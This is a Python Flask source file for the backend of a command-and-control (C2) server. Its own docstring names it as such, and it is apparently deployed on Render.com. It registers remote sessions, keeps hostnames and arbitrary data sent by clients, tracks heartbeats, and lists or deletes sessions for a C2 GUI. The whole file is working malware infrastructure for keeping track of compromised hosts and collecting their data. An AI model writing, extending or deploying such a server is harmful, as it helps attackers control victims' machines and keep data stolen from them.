from flask import Flask, request, jsonify
import time

SESSIONS = {}

app = Flask(__name__)

@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    session_id = data.get("session_id")
    if session_id:
        print(f"[*] [{time.strftime('%Y-%m-%d %H:%M:%S')}] Received new session: {data.get('hostname')}")
        SESSIONS[session_id] = {
            "session_id": session_id,
            "hostname": data.get("hostname"),
            "data": data.get("data"),
            "last_seen": time.time()
        }
    return jsonify({"status": "ok"}), 200

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json
    session_id = data.get("session_id")
    if session_id and session_id in SESSIONS:
        SESSIONS[session_id]["last_seen"] = time.time()
    return jsonify({"status": "ok"}), 200

@app.route('/api/get_sessions', methods=['GET'])
def get_sessions():
    return jsonify(list(SESSIONS.values()))

# --- NEW ENDPOINT TO HANDLE DELETION ---
@app.route('/api/delete_session', methods=['POST'])
def delete_session():
    """
    Receives a session_id from the C2 GUI and deletes that session from memory.
    """
    data = request.json
    session_id = data.get("session_id")
    if session_id and session_id in SESSIONS:
        del SESSIONS[session_id]
        print(f"[*] [{time.strftime('%Y-%m-%d %H:%M:%S')}] Deleted session: {session_id}")
        return jsonify({"status": "deleted"}), 200
    else:
        return jsonify({"status": "not_found"}), 404
# ------------------------------------------

def run_server():
    # This is only used by Render.com
    app.run(host='0.0.0.0', port=5001)